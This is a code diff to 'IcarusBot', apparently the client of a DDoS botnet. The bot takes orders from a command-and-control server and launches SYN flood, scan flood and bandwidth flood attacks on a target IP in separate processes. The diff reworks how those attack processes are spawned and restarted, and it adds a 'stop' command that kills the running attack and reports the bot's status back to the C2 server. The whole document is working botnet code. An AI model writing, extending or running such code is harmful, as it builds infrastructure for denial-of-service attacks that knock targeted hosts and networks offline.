@@ -80,7 +80,7 @@ class IcarusBot:
         self.exceptionsThrown = 0  # Tracks errors thrown during operation.
 
         # This is to deal with the active subprocess
-        self.mp = []
+        self.mp = None
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
@@ -204,7 +204,12 @@ class IcarusBot:
                             #                                   proc.terminate()  # sends a SIGTERM
 
                             # The following code is hilariously long and redundant, but who cares?
-                            for n in range(0, 15):
+                            if self.mp is None:
+                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
@@ -239,7 +244,12 @@ class IcarusBot:
                                                      args=(target_ip, NUM_PACKETS_TO_SEND))
                                 self.mp.start()
                         elif attack_type == 'SCAN_FLOOD':
-                            for n in range(0, 15):
+                            if self.mp is None:
+                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
                                 self.mp = mp.Process(target=scan_flood.SCAN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND))
                                 self.mp.start()
@@ -253,7 +263,6 @@ class IcarusBot:
                                 self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
                                 self.mp.start()
-
                         print("EXECUTING ATTACK:", attack_type)
                         response = {
                             'ip': self.ip,
@@ -266,6 +275,7 @@ class IcarusBot:
                             'exceptionsThrown': self.exceptionsThrown
                         }
                         response = json.dumps(response)
+
                     except Exception as ex:
                         self.exceptionsThrown += 1
                         print("ERROR EXECUTING ATTACK", ex)
@@ -280,7 +290,24 @@ class IcarusBot:
                             'exceptionsThrown': self.exceptionsThrown
                         }
                         response = json.dumps(response)
-
+                elif request_type == 'stop':
+                    if self.mp is not None:
+                        self.mp.terminate()
+                    notification("STOPPED")
+                    self.status = "IDLE"
+                    self.attack_type = "none"
+                    self.target_ip = "none"
+                    response = {
+                        'ip': self.ip,
+                        'status': self.status,
+                        'id': self.bot_id,
+                        'runtime': self.attack_runtime,
+                        'bandwidth': self.uploadBandwidth,
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
+                    }
+                    response = json.dumps(response)
                 # This will then send the message back to the server, irrespective of the flag.
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
